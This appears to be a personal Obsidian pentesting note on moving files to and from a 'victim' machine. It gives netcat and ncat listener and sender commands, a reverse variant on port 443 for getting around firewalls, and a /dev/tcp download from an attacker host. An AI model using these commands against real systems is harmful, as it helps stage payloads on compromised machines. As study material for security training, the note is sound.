```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```
## Through Tools
### Using NetCat & Ncat
```bash
# 1. [On victim] Start a server on the victim machine, redirecting to our output file
nc -l -p 8000 > file.exe
ncat -l -p 8000 --recv-only > file.exe

# 2. [On local] Upload a file
nc -q 0 <ip> 8000 < file.exe
ncat --send-only <ip> 8000 < file.exe
```
This can be done in reverse (eg. file wall blocks above):
```bash
# 1. [On local] Start a server
sudo nc -l -p 443 -q 0 < file.exe
sudo ncat -l -p 443 --send-only < file.exe

# 2. [On victim] Recieve file
nc <ip> 443 > file.exe
ncat <ip> 443 --recv-only > file.exe
cat < /dev/tcp/<ip>/443 > file.exe
```
## Through Code
![[File Transfer Through Code]]

## Linux Specific
![[Operating Systems/Linux/File Transfer|File Transfer]]

## Windows Specific
![[Operating Systems/Windows/File Transfer|File Transfer]]